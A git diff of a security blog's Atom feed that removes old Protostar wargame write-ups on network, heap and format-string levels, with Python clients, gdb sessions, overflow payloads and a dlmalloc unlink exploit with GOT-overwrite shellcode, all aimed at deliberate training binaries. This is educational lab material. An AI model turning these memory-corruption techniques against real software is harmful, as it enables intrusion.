@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vulnhub | ]]></title>
   <link href="http://hatRiot.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2018-05-24T23:45:52-07:00</updated>
+  <updated>2018-08-22T09:06:12-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,1021 +12,6 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar solutions - Network]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/11/23/protostar-network/"/>
-    <updated>2014-11-23T13:10:04-08:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/11/23/protostar-network</id>
-    <content type="html"><![CDATA[<p>Previous posts:</p>
-
-<p><a href="http://hatriot.github.io/blog/2013/03/31/protostar-solutions-stack-levels/">Protostar &ndash; Stack</a><br/>
-<a href="http://hatriot.github.io/blog/2014/09/16/protostar-format-strings/">Protostar &ndash; Format String</a><br/>
-<a href="http://hatriot.github.io/blog/2014/09/21/protostar-heap-exploits/">Protostar &ndash; Heap</a></p>
-
-<p>The network stages were pretty simple and emphasized more on data representation, rather than remote exploitation.</p>
-
-<h2>Network 00</h2>
-
-<p>The network levels all have binaries running on the system on various ports.  The first level runs on port 2999.  We can attach to the process with gdb and send over some junk data:</p>
-
-<p>```</p>
-
-<h1>echo &ldquo;xxxx&rdquo; | nc 192.168.1.106 2999</h1>
-
-<p>Please send &lsquo;652467094&rsquo; as a little endian 32bit int
-I&rsquo;m sorry, you sent 2021161080 instead
-```</p>
-
-<p>Looking at the <a href="https://exploit-exercises.com/protostar/net0/">source code</a>, we want to send a string that, when cast to an unsigned integer, equals some random value.  To do this, we simply open up a socket to the listener, read in the number, transform it to little endian, and send it back.  Using a bit of Python-fu we quickly arrive at a solution:</p>
-
-<p>```
-import socket
-import struct
-import sys
-from re import findall</p>
-
-<p>try:</p>
-
-<pre><code>sock = socket.socket()
-sock.connect(('192.168.1.106', 2999))
-
-data = sock.recv(256)
-
-m = findall("Please send '(.*?)' as", data)
-if len(m) &gt; 0:
-    m = int(m[0])
-else:
-    print 'No data received?'
-    sys.exit(1)
-
-print 'Swapping %s to little endian 32bit int' % m
-swapped = struct.pack('&lt;Q', m)
-
-print 'Swapped to %s' % repr(swapped)
-sock.sendall(str(swapped))
-
-data = sock.recv(512)
-print data
-</code></pre>
-
-<p>except Exception, e:</p>
-
-<pre><code>print e
-</code></pre>
-
-<p>finally:</p>
-
-<pre><code>sock.close()
-</code></pre>
-
-<p>```</p>
-
-<p>And when ran:</p>
-
-<p>```</p>
-
-<h1>python protostar_net0.py</h1>
-
-<p>Swapping 1295208340 to little endian 32bit int
-Swapped to &lsquo;\x94O3M\x00\x00\x00\x00&rsquo;
-Thank you sir/madam
-```</p>
-
-<h2>Network 01</h2>
-
-<p>This stage simply requires us to unpack an unsigned integer:</p>
-
-<p>```
- unsigned int wanted;</p>
-
-<p>  wanted = random();</p>
-
-<p>  sprintf(fub, &ldquo;%d&rdquo;, wanted);</p>
-
-<p>  if(write(0, &amp;wanted, sizeof(wanted)) != sizeof(wanted)) {</p>
-
-<pre><code>  errx(1, ":(\n");
-</code></pre>
-
-<p>  }
-```</p>
-
-<p>Trivially accomplished with some struct packing:</p>
-
-<p>```
-import socket
-import struct</p>
-
-<p>try:</p>
-
-<pre><code>sock = socket.socket()
-sock.connect(('192.168.1.106', 2998))
-
-data = sock.recv(256)
-
-swapped = str(struct.unpack('&lt;I', data)[0])
-print swapped
-sock.sendall(swapped + '\r\n')
-print sock.recv(256)
-</code></pre>
-
-<p>except Exception, e:</p>
-
-<pre><code>print e
-</code></pre>
-
-<p>finally:</p>
-
-<pre><code>sock.close()
-</code></pre>
-
-<p>```</p>
-
-<p>Which gives us:</p>
-
-<p>```</p>
-
-<h1>python protostar_net1.py</h1>
-
-<p>1413209085
-you correctly sent the data
-```</p>
-
-<h2>Network 02</h2>
-
-<p>The third network level tasks us with reading in 4 unsigned integers, adding them together, and sending back the result.  The &ldquo;trick&rdquo; in this stage, if you will, is that uint32 arithmetic needs to take into account wrapping.  To accomplish this, we want our result to never be negative, which requires us to define the result modulo 2<sup>n</sup>, where n = bit length.</p>
-
-<p>This makes for a pretty simple stage:</p>
-
-<p>```
-import struct
-import socket</p>
-
-<p>try:</p>
-
-<pre><code>sock = socket.socket()
-sock.connect(('192.168.1.106', 2997))
-
-# read in our four numbers
-total = 0
-for i in xrange(4):
-    n = sock.recv(4)
-    n = struct.unpack('&lt;I', n)[0]
-    print 'Read digit %d' % n
-    total += n
-
-total = total &amp; 0xffffffffL
-total = struct.pack('&lt;I', total)
-sock.sendall(total)
-print sock.recv(256)
-</code></pre>
-
-<p>except Exception, e:</p>
-
-<pre><code>print e
-</code></pre>
-
-<p>finally:</p>
-
-<pre><code>sock.close()
-</code></pre>
-
-<p>```</p>
-
-<p>Note that we AND the final result by 2<sup>n</sup>, ensuring we have a positive 32 bit value.</p>
-
-<p>When run:</p>
-
-<p>```</p>
-
-<h1>python protostar_net2.py</h1>
-
-<p>Read digit 1533721612
-Read digit 363484815
-Read digit 1200915436
-Read digit 1572177737
-you added them correctly</p>
-
-<p>```</p>
-
-<h2>Network 03</h2>
-
-<p>The most enjoyable of the four levels, this stage requires us to reverse a dead simple login routine and perform the login.  We&rsquo;ll start by checking out the code and figuring out what it&rsquo;s doing:</p>
-
-<p>```
-while(1) {</p>
-
-<pre><code>  // from the connection, read in the total length of the packet, then
-  // parse with ntohs and allocate the buffer with malloc
-  nread(fd, &amp;len, sizeof(len));
-  len = ntohs(len);
-  buffer = malloc(len);
-
-  if(! buffer) errx(1, "malloc failure for %d bytes", len);
-
-  // read in LEN bytes into BUFFER
-  nread(fd, buffer, len);
-</code></pre>
-
-<p>```</p>
-
-<p>I&rsquo;ve commented the code inline to ease understanding.  Essentially, the first byte of our packet must be the total length of the packet.</p>
-
-<p>```
-  // switch on the first byte of the buffer
-  switch(buffer[0]) {</p>
-
-<pre><code>      // if the first byte is \x17, initiate login routine
-      case 23:
-          // invoke login() with buffer + 1 (skip length byte) and total len - 1 of the packet
-          loggedin = login(buffer + 1, len - 1);
-          send_string(fd, 33, loggedin ? "successful" : "failed");
-          break;
-
-      default:
-          send_string(fd, 58, "what you talkin about willis?");
-          break;
-  }
-</code></pre>
-
-<p>```</p>
-
-<p>If the first byte of the buffer (second in the packet) is \x17, it initiates login.</p>
-
-<p>```
-  deduct = get_string(&amp;resource, buffer, len);
-  deduct += get_string(&amp;username, buffer+deduct, len-deduct);
-  deduct += get_string(&amp;password, buffer+deduct, len-deduct);</p>
-
-<p>  success = 0;
-  success |= strcmp(resource, &ldquo;net3&rdquo;);
-  success |= strcmp(username, &ldquo;awesomesauce&rdquo;);
-  success |= strcmp(password, &ldquo;password&rdquo;);
-```</p>
-
-<p>Here&rsquo;s the real meat of the login routine; we need three, null-terminated strings that match &ldquo;net3&rdquo;, &ldquo;awesomesauce&rdquo;, and &ldquo;password&rdquo;, respectively, to successfully authenticate to the application.  The <code>get_string</code> fuction pulls these strings out one by one:</p>
-
-<p>```
-  unsigned char byte;</p>
-
-<p>  byte = *buffer;</p>
-
-<p>  // if it&rsquo;s malformed, i.e. not null term&rsquo;d
-  if(byte > len) errx(1, &ldquo;badly formed packet&rdquo;);</p>
-
-<p>  // malloc size of byte, which is the first byte at the start of the buffer
-  *result = malloc(byte);</p>
-
-<p>  // strcpy buffer + 1 into the result pointer location
-  strcpy(*result, buffer + 1);</p>
-
-<p>  // return number of bytes read
-  return byte + 1;
-```</p>
-
-<p>The caveat here is that we need to prepend the string length to each entry, then null terminate it.  This was quite simple to hack up, once it&rsquo;d been reversed:</p>
-
-<p>```
-import struct
-import socket</p>
-
-<p>IP = &lsquo;192.168.1.106&rsquo;
-PORT = 2996</p>
-
-<p>try:</p>
-
-<pre><code>sock = socket.socket()
-sock.connect((IP, PORT))
-
-resource = "net3\x00"
-username = "awesomesauce\x00"
-password = "password\x00"
-
-# build login packet 
-packet = struct.pack('B', 23)
-packet += struct.pack('B', len(resource)) + resource
-packet += struct.pack('B', len(username)) + username
-packet += struct.pack('B', len(password)) + password
-packet_len = struct.pack('&gt;H', len(packet))
-
-print '[!] Sending packet (%d)' % (len(packet) + len(packet_len))
-
-sock.sendall(packet_len + packet)
-
-print sock.recv(128)
-</code></pre>
-
-<p>except Exception, e:</p>
-
-<pre><code>print e
-</code></pre>
-
-<p>finally:</p>
-
-<pre><code>sock.close()
-</code></pre>
-
-<p>```</p>
-
-<p>Note that we&rsquo;re sending the packet length big endian due to the <code>ntohs</code> call returning a little endian value.  And once run:</p>
-
-<p>```</p>
-
-<h1>python protostar_net3.py</h1>
-
-<p>[!] Sending packet (33)</p>
-
-<p>!successful
-```</p>
-
-<h2>Network 04</h2>
-
-<p>Although net04 is not listed anywhere on the site, I noticed that it was both running and available in the <code>/opt/protostar/bin</code> directory.  Disassembling it reveals the answer:</p>
-
-<p><code>
- 80497a8:   e8 ff f3 ff ff          call   8048bac &lt;srandom@plt&gt;
- 80497ad:   8b 44 24 18             mov    eax,DWORD PTR [esp+0x18]
- 80497b1:   89 04 24                mov    DWORD PTR [esp],eax
- 80497b4:   e8 a1 ff ff ff          call   804975a &lt;run&gt;
-</code></p>
-
-<p><main> does exactly what the rest of the stages have done: backgrounding the process as the current user, serving the socket up indefinitely, changing STDIO, and invoking run().  However, stage fours run is a big nop:</p>
-
-<p><code>
-0804975a &lt;run&gt;:
- 804975a:   55                      push   ebp
- 804975b:   89 e5                   mov    ebp,esp
- 804975d:   5d                      pop    ebp
- 804975e:   c3                      ret  
-</code></p>
-
-<p>Not so much of a stage!  On to the final stages.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar solutions - Heap Exploitation]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits/"/>
-    <updated>2014-09-21T14:10:04-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits</id>
-    <content type="html"><![CDATA[<p>And we&rsquo;re back with Protostar, this time working on the heap section.</p>
-
-<h2>Heap Exploits 0</h2>
-
-<p>Introductory level that demonstrates overflowing heap structures.  It&rsquo;s pretty simple:</p>
-
-<p><code>
-user@protostar:/opt/protostar/bin$ objdump -dt heap0 | grep winner
-08048464 g     F .text  00000014              winner
-08048478 g     F .text  00000014              nowinner
-08048464 &lt;winner&gt;:
-08048478 &lt;nowinner&gt;:
-</code></p>
-
-<p>And then we find our EIP offset:</p>
-
-<p>```
-(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
-Starting program: /opt/protostar/bin/heap0 $(python -c &lsquo;print &ldquo;A&rdquo;<em>72 + &ldquo;B&rdquo;</em>4&rsquo;)
-data is at 0x804a008, fp is at 0x804a050</p>
-
-<p>Program received signal SIGSEGV, Segmentation fault.
-0x42424242 in ?? ()
-```</p>
-
-<p>Using our mad exploit skills:</p>
-
-<p><code>
-$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
-data is at 0x804a008, fp is at 0x804a050
-level passed
-</code></p>
-
-<h2>Heap Exploits 1</h2>
-
-<p>This challenge dives a bit more into heap exploitation with a nice write-what-where, and the goal is to redirect execution flow to the function <code>winner</code>.  Let&rsquo;s find that first:</p>
-
-<p><code>
-$ objdump -dt heap1 | grep winner
-08048494 g     F .text  00000025              winner
-</code></p>
-
-<p>Now let&rsquo;s check out the actual bug:</p>
-
-<p>```
-(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;B&rdquo;</em>4&rsquo;) xx</p>
-
-<p>Program received signal SIGSEGV, Segmentation fault.
-*__GI_strcpy (dest=0x42424242 <Address 0x42424242 out of bounds>, src=0xbffff9a3 &ldquo;xx&rdquo;) at strcpy.c:40
-40  strcpy.c: No such file or directory.</p>
-
-<pre><code>in strcpy.c
-</code></pre>
-
-<p>```</p>
-
-<p>As we can see, we control the source (argument two) and the destination, address one, which is the result of a pointer overflow in the following code:</p>
-
-<p><code>
-strcpy(i1-&gt;name, argv[1]);
-strcpy(i2-&gt;name, argv[2]);
-</code></p>
-
-<p>We have a couple of options for exploitation, but I chose to simply overwrite ebp+4 to take control over the return address.  Let&rsquo;s find that first:</p>
-
-<p>```
-(gdb) b *0x08048566
-Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.
-(gdb) r xx yy
-Starting program: /opt/protostar/bin/heap1 xx yy
-and that&rsquo;s a wrap folks!</p>
-
-<p>Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:35
-35  heap1/heap1.c: No such file or directory.</p>
-
-<pre><code>in heap1/heap1.c
-</code></pre>
-
-<p>(gdb) x/wx $ebp
-0xbffff7b8: 0xbffff838
-```</p>
-
-<p>This shows ebp is located at 0xbffff7b8, so let&rsquo;s overwrite that:</p>
-
-<p>```
-(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;B&rdquo;<em>4&rsquo;)
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;</em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;<em>4 + &ldquo;B&rdquo;</em>4&rsquo;)
-and that&rsquo;s a wrap folks!</p>
-
-<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
-35  in heap1/heap1.c
-(gdb) x/wx $ebp
-0xbffff798: 0x41414141
-(gdb) x/wx $ebp+4
-0xbffff79c: 0x42424242
-(gdb)
-```</p>
-
-<p>Note that ebp&rsquo;s address changed; this is a stupid method and is susceptible to stack shifting, so we need to ensure we accomodate for that.  Anyway, now we can control where we return to, so let&rsquo;s pop in our winning address:</p>
-
-<p>```
-(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo;&rsquo;)</p>
-
-<p>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
-35  in heap1/heap1.c
-(gdb) x/wx $ebp
-0xbffff798: 0x41414141
-(gdb) x/wx $ebp+4
-0xbffff79c: 0x08048494
-(gdb) c
-Continuing.
-and we have a winner @ 1410933753</p>
-
-<p>Program received signal SIGSEGV, Segmentation fault.
-0x00000000 in ?? ()
-(gdb)
-```</p>
-
-<p>And that&rsquo;s all!  Notice we still segfault, this is because we&rsquo;ve totally screwed up the stack, and it&rsquo;s trying to pop another value off the stack and return there.  We can trivally fix that by appending the address for exit:</p>
-
-<p>```
-(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
-Starting program: /opt/protostar/bin/heap1 $(python -c &lsquo;print &ldquo;A&rdquo;<em>20 + &ldquo;\x98\xf7\xff\xbf&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;A&rdquo;</em>4 + &ldquo;\x94\x84\x04\x08&rdquo; + &ldquo;\xc0\x60\xec\xb7&rdquo;&rsquo;)
-and that&rsquo;s a wrap folks!
-and we have a winner @ 1410933890</p>
-
-<p>Program exited with code 0124.
-(gdb)
-```</p>
-
-<h2>Heap Exploits 2</h2>
-
-<p>This one is pretty simple, and doesn&rsquo;t require us to really exploit much.  What we have is basically a contrived authentication service that&rsquo;s got four commands: auth, reset, service, and login.  The goal is to trigger the &ldquo;you have logged in already!&rdquo; message.  Here&rsquo;s the solution:</p>
-
-<p><code>
-user@protostar:/opt/protostar/bin$ ./heap2
-[ auth = (nil), service = (nil) ]
-auth xx
-[ auth = 0x804c008, service = (nil) ]
-service xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
-[ auth = 0x804c008, service = 0x804c018 ]
-login
-you have logged in already!
-[ auth = 0x804c008, service = 0x804c018 ]
-</code></p>
-
-<p>First we auth, which allocates the auth structure:</p>
-
-<p>```
-if(strncmp(line, &ldquo;auth &rdquo;, 5) == 0) {
-  auth = malloc(sizeof(auth));
-  memset(auth, 0, sizeof(auth));
-  if(strlen(line + 5) &lt; 31) {</p>
-
-<pre><code>strcpy(auth-&gt;name, line + 5);
-</code></pre>
-
-<p>  }
-}
-```</p>
-
-<p>Then we execute service with a long string:</p>
-
-<p>```
-if(strncmp(line, &ldquo;service&rdquo;, 6) == 0) {</p>
-
-<pre><code>  service = strdup(line + 7);
-</code></pre>
-
-<p>}
-```</p>
-
-<p>strdup duplicates a string, allocated via malloc.  Note in the auth struct allocation that it&rsquo;s only allocating <code>sizeof(auth)</code>.  This is an incorrect allocation, as it&rsquo;s really just allocating memory for a struct <em>pointer</em>, and not the 30 odd bytes for the structure.  We can easily demonstrate this with multiple auth struct allocations:</p>
-
-<p><code>
-$ ./heap2
-[ auth = (nil), service = (nil) ]
-auth 1
-[ auth = 0x804c008, service = (nil) ]
-auth 2
-[ auth = 0x804c018, service = (nil) ]
-</code></p>
-
-<p>This 16 byte difference is comprised solely of chunk headers.  All we need to do is set the auth flag in the struct to some non-zero value, which can be done with the service command and our arbitrarily long string allocation.</p>
-
-<p>```
-if(strncmp(line, &ldquo;login&rdquo;, 5) == 0) {</p>
-
-<pre><code>if(auth-&gt;auth) {
-  printf("you have logged in already!\n");
-} else {
-  printf("please enter your password\n");
-}
-</code></pre>
-
-<p>  }
-```</p>
-
-<h2>Heap Exploits 3</h2>
-
-<p>This is the level that I thought more of these would be; this level requires us to manipulate heap metadata in order to obtain code execution.  Whilst this method is terribly outdated and not applicable at all to modern heaps, it&rsquo;s still a blast, and many of the high level methods still apply.</p>
-
-<p>I highly, highly recommend reading the essential <a href="http://phrack.org/issues/57/9.html"><em>Once Upon A Free()</em></a> if you&rsquo;re unfamiliar with old school, dlmalloc heap exploitation, as there is quite a bit of prerequisite knowledge necessary to complete this stage.  I&rsquo;ll assume the reader has a cursory understanding of how this process will go down.</p>
-
-<p>Much like the previous stages, we need to redirect the program to another function, <code>winner</code>.  Stage 3 executes three separate, 32 byte malloc&rsquo;s, strcpy&rsquo;s our input into each chunk, then free&rsquo;s them in <a href="http://webcache.googleusercontent.com/search?q=cache:TddtBQ76DO4J:exploit-exercises.com/protostar/heap3+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=us">reverse</a>:</p>
-
-<p>```
-a = malloc(32);
-b = malloc(32);
-c = malloc(32);</p>
-
-<p>strcpy(a, argv[1]);
-strcpy(b, argv[2]);
-strcpy(c, argv[3]);</p>
-
-<p>free&copy;;
-free(b);
-free(a);
-```</p>
-
-<p>Let&rsquo;s first check out the memory layout.  After all three allocations and strcpy&rsquo;s, but before any free&rsquo;s:</p>
-
-<p><code>
-(gdb) x/10wx 0x804c008-8
-0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
-0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000
-(gdb) x/10wx 0x804c030-8
-0x804c028:  0x00000000  0x00000029  0x42424242  0x00000000
-0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c048:  0x00000000  0x00000000
-(gdb) x/10wx 0x804c058-8
-0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
-0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000
-(gdb)
-</code></p>
-
-<p>Recall that each chunk has metadata in-channel that allows dlmalloc to traverse, coalesce, and fetch chunks on the heap.  In the above case, three allocated chunks have two requisite fields: <code>prev_size</code> and <code>size</code>.  As none of the previous chunks in the heap have been free&rsquo;d, the<code>prev_size</code> field is 0x0.  The size field is 0x29, or 41.  The lower three bits are reserved in this field, so accounting for that:</p>
-
-<p><code>
-(gdb) p/d 0x29 &amp; ~3
-$1 = 40
-(gdb)      
-</code></p>
-
-<p>These three chunks are then free&rsquo;d in reverse order, starting from chunk c.  Exploitation for this rather straight forward, we just need to overflow adjacent metadata headers to craft an illicit chunk.  Once free enters its unlink macro, we obtain execution flow control.</p>
-
-<p>We need to start by setting the <code>prev_size</code> and <code>size</code> fields to values that allow us to control forward and backward chunk pointers.  We begin by setting both fields to 0xffffffc, or -4.</p>
-
-<p>```
-(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC
-Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) BBBB CCCC</p>
-
-<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
-24  in heap3/heap3.c
-(gdb) x/10wx 0x804c030-8
-0x804c028:  0xfffffffc  0xfffffffc  0x42424242  0x00000000
-0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c048:  0x00000000  0x00000000
-```</p>
-
-<p>We now shift to setting the flink and blink values, which are set once a chunk is freed.  Let&rsquo;s inspect these chunks after all three have been freed:</p>
-
-<p><code>
-(gdb) x/10wx 0x804c008-8
-0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
-0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c020:  0x00000000  0x00000000
-(gdb) x/10wx 0x804c030-8
-0x804c028:  0x00000000  0x00000029  0x0804c050  0x00000000
-0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c048:  0x00000000  0x00000000
-(gdb) x/10wx 0x804c058-8
-0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
-0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
-0x804c070:  0x00000000  0x00000000
-</code></p>
-
-<p>The value after the <code>size</code> field is a forward pointer to the next free chunk.  There would typically be another pointer in the next field, a backwards link, however, dlmalloc employs what&rsquo;s known as fastbins.  This is a singly-linked list holding recently freed small chunks ( &lt; 64 bytes).  More on this can be found <a href="ftp://g.oswego.edu/pub/misc/malloc-2.7.0.c">here</a>.</p>
-
-<p>Taking a quick peek at the exploitable unlink macro:</p>
-
-<p>```</p>
-
-<h1>define unlink(P, BK, FD)</h1>
-
-<p>{
-  BK = P->bk;
-  FD = P->fd;
-  FD->bk = BK;
-  BK->fd = FD;
-}
-```
-This macro will essentially update chunk pointers to, naturally, unlink a recently freed chunk.  This boils down to:</p>
-
-<p><code>
-*(next-&gt;fd + 12) = next-&gt;bk
-*(next-&gt;bk + 8) = next-&gt;fd
-</code></p>
-
-<p>A simple write-what-where.  If we set fd to <code>return address - 0xc</code>, or the where, then bk is the what and ends up being the value popped into EIP.  Let&rsquo;s test this out by attempting to write 0x42424242 into chunk A:</p>
-
-<p>```
-(gdb) r $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /opt/protostar/bin/heap3 $(python -c &lsquo;print &ldquo;A&rdquo;<em>32 + &ldquo;\xfc\xff\xff\xff&rdquo;</em>2&rsquo;) $(python -c &lsquo;print &ldquo;B&rdquo;<em>4 + &ldquo;\xfc\xbf\x04\x08&rdquo; + &ldquo;B&rdquo;</em>4&rsquo;) CCCC</p>
-
-<p>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
-24  in heap3/heap3.c
-(gdb) ni 3</p>
-
-<p>Program received signal SIGSEGV, Segmentation fault.
-0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
-3638    common/malloc.c: No such file or directory.
-in common/malloc.c
-(gdb) x/10wx 0x804c008-8
-0x804c000:  0x00000000  0x00000029  0x42424242  0x41414141
-0x804c010:  0x41414141  0x41414141  0x41414141  0x41414141
-0x804c020:  0x41414141  0x41414141
-(gdb)
-```</p>
-
-<p>So we can write a controlled value somewhere.  We&rsquo;ll take the path of least resistance for exploitation and overwrite the GOT entry for puts with the location of our shellcode, which will be a simple jump to the appropriate function.</p>
-
-<p><code>
-$ objdump -t --dynamic-relo ./heap3 | grep puts
-0804b128 R_386_JUMP_SLOT   puts
-</code></p>
-
-<p>and winner:</p>
-
-<p><code>
-(gdb) p winner
-$2 = {void (void)} 0x8048864 &lt;winner&gt;
-</code></p>
-
-<p>Since our return address needs to be at an offset of -0xc, we&rsquo;ll be using <code>0x804b11c</code> as the return address.  It is also worth noting that the first field of the chunk is clobbered during the free routine, so we&rsquo;ll need an offset of +4 there as well.</p>
-
-<p>```
-(gdb) r AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y</p>
-
-<p>Starting program: /opt/protostar/bin/heap3 AAAA$(python -c &lsquo;print &ldquo;A&rdquo;<em>28 + &ldquo;\xfc\xff\xff\xff&rdquo; + &ldquo;\xfc\xff\xff\xff&rdquo;&rsquo;) $(python -c &lsquo;print &ldquo;\x41&rdquo;</em>4 + &ldquo;\x1c\xb1\x04\x08&rdquo; + &ldquo;\x0c\xc0\x04\x08&rdquo;&rsquo;) CCCC</p>
-
-<p>Breakpoint 1, 0x08048935 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
-24  heap3/heap3.c: No such file or directory.</p>
-
-<pre><code>in heap3/heap3.c
-</code></pre>
-
-<p>(gdb) x/i $eip
-0x8048935 &lt;main+172>:   call   0x8048790 &lt;puts@plt>
-(gdb) si
-0x08048790 in puts@plt ()
-(gdb) x/i $eip
-0x8048790 &lt;puts@plt>:   jmp    DWORD PTR ds:0x804b128
-(gdb) ni
-0x0804c00c in ?? ()
-(gdb) x/wx $eip
-0x804c00c:  0x41414141
-(gdb)
-```</p>
-
-<p>This gives us about eight bytes until the clobbered field, but this is sufficient for our purposes.  Using metasm, we can generate shellcode for a simple <code>call winner</code>:</p>
-
-<p><code>
-metasm &gt; push 0x08048864; ret
-"\x68\x64\x88\x04\x08\xc3"
-metasm &gt;
-</code></p>
-
-<p><code>
-user@protostar:/opt/protostar/bin$ ./heap3 AAAA$(python -c 'print "\x68\x64\x88\x04\x08\xc3" + "A"*22 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
-that wasn't too bad now, was it? @ 1411285668
-user@protostar:/opt/protostar/bin$
-</code></p>
-
-<p>And that&rsquo;s it!  I really wish this level had more dlmalloc exploitation, or post-2004 stuff (see <a href="http://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt">here</a>), but this was fun as is.  Fusion seems to be an advanced version of Protostar, so here&rsquo;s to hoping there&rsquo;s more there.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Protostar solutions - Format String]]></title>
-    <link href="http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings/"/>
-    <updated>2014-09-16T14:10:04-07:00</updated>
-    <id>http://hatRiot.github.io/blog/2014/09/16/protostar-format-strings</id>
-    <content type="html"><![CDATA[<p>Wow it&rsquo;s been awhile since I&rsquo;ve taken a look at this box.  The last time I was here, I was working on the format string levels.  These levels have been done and documented to death, but hey, they&rsquo;re fun.  So, without further delay, lets begin.</p>
-
-<p>I&rsquo;ll be assuming you know what a format string is, and if not, you can follow allowing with <a href="http://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf">this</a> great paper.</p>
-
-<h2>Format String Level 00</h2>
-
-<p>This level really just points out that vulnerabilities exist in <code>sprintf</code>, and isn&rsquo;t too different from any of the easier stack levels.  All we&rsquo;ve got to do is overwrite an integer on the stack with 0xdeadbeef.  A 64 byte buffer is allocated, our target integer is assigned to 0 (after the allocated buffer), and <code>snprintf</code> invoked.  So 64 bytes of junk followed by 4 bytes should give us&hellip;</p>
-
-<p>```
-(gdb) r $(python -c &ldquo;print &lsquo;A&rsquo;<em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)
-Starting program: /opt/protostar/bin/format0 $(python -c &ldquo;print &lsquo;A&rsquo;</em>64 + &lsquo;\xef\xbe\xad\xde&rsquo;&rdquo;)</p>
-
-<p>Breakpoint 1, vuln (string=0xbffff95f &lsquo;A&rsquo; <repeats 64 times>, &ldquo;ﾭ&rdquo;, <incomplete sequence \336>) at format0/format0.c:15
-15  in format0/format0.c
